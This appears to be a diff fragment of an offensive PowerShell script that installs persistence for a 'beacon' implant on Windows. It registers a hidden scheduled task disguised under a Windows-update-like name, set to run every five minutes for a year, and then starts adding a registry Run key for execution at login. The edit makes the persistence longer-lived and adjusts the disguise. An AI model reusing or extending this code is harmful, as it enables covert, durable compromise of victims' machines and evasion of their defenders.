@@ -12,9 +12,9 @@ $beaconPaths = @(
 # 1. Create scheduled task (5-minute interval)
 Write-Host "[+] Creating scheduled task persistence..."
 $action = New-ScheduledTaskAction -Execute $beaconPaths[0]
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365)
 $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -Force
+Register-ScheduledTask -TaskName "WindowsUpdater" -Action $action -Trigger $trigger -Settings $settings -Force
 
 # 2. Registry Run Key (runs on login)
 Write-Host "[+] Creating registry run key persistence..."
